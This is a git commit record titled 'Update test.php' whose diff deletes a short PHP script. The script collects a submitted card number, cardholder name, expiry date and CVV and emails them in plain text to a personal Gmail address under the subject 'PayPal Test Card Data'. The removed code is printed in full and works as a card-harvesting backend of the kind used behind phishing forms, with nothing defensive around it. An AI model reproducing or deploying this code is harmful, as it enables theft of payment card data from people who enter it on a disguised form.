00553923569bd33a8dfdb63ae0cae5235f573f8c
marwanbelhouki <136027359+marwanbelhouki@users.noreply.github.com>
2024-02-15 10:50:17 -0800

    Update test.php

--- test.php
+++ test.php
@@ -1,19 +1,1 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $cardNumber = $_POST['cardNumber'];
-    $cardHolder = $_POST['cardHolder'];
-    $expirationDate = $_POST['expirationDate'];
-    $cvv = $_POST['cvv'];
 
-    $to = "marwanbelhouki8@gmail.com";  // Your email
-    $subject = "PayPal Test Card Data";
-    $message = "Card Number: " . $cardNumber . "\nCard Holder: " . $cardHolder . "\nExpiration Date: " . $expirationDate . "\nCVV: " . $cvv;
-    $headers = "From: your_email@gmail.com";  // Replace with your email
-
-    if (mail($to, $subject, $message, $headers)) {
-        echo "<p>Email sent successfully.</p>";
-    } else {
-        echo "<p>An error occurred while sending the email.</p>";
-    }
-}
-?>
